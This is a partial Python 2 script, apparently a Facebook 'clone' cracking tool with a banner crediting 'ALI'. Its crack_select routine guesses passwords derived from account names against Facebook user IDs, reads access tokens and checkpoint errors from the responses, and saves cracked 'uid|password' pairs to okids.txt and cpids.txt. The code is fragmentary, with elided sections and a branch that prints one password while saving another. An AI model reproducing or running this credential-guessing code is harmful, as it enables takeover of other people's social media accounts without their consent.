...
\033[1;92m\n __/\\\\\\\\\_/\\\\\\____/\\\\\\\\\____/\\\\\\\\\_/\\\\\\\\\\\\\\\_____        
 _/\\\\\\\\\\\\\_\////\\\___/\\\///////\\\_/\\\\\\\\\\\\\\////////////\\\______       
  _/\\\/////////\\\_\/\\\__/\\\\/\\\__\/\\\_/\\\/////////\\\____/\\\/_______      
   \/\\\__\/\\\__\/\\\__\///_\/\\\\\\\\\\\/_\/\\\___\/\\\____/\\\/__/\\\\\\\\\_     
    \/\\\\\\\\\\\\\\\_\/\\\__/\\\\/\\\//////\\\__\/\\\\\\\\\\\\\\\___/\\\/__\////////\\\__    
     \/\\\/////////\\\_\/\\\__\/\\\_\/\\\__\//\\\__\/\\\/////////\\\_/\\\/___/\\\\\\\\\\_   
      \/\\\__\/\\\__\/\\\__\/\\\_\/\\\__\//\\\\/\\\__\/\\\__/\\\/____/\\\/////\\\_  
       \/\\\__\/\\\_/\\\\\\\\\\/\\\_\/\\\___\//\\\\/\\\___\/\\\_/\\\\\\\\\\\\\\\\//\\\\\\\\/\\_ 
        \///__\///\/////////\///\///__\///\///__\///\///////////////_\////////\//_

 
\n\033[0m----------------------------------
\033[1;92mAuthor \033[1;93m: ALI
\033[1;92mFb \033[1;93m: Ali Raza
...
def log_sel():
	...
	main()
        ...
        os.system('xdg-open https://www.facebook.com/aliraza9676')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
...
def crack():
    ...
    print logo
    print ''
    print '\x1b[1;0m 1. \033[1;96mClone 3 Links\033[0m \n 2. \033[1;96mClone Single id\033[0m' ##THANKX ALI BRO
    print ''
    crack_select()
...
def crack_select():
    ...
    print ' \x1b[1;94m  Wait Ids Will Appear Here \033[0m'#THANKX ALI BRO
    print 45 * '_'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[Ali-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[ALi-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;31m[Ali-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + 'ali'
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;31m[Ali-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #THANKX ALI BRO
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
    ...
    print '   \x1b[0m Total Ok / Cp ids : ' + str(len(oks)) + '/' + str(len(cps)) ##THANKX ALi BRO
    print 45 * '\033[0m_\033[0m'
    print ''
    print ''
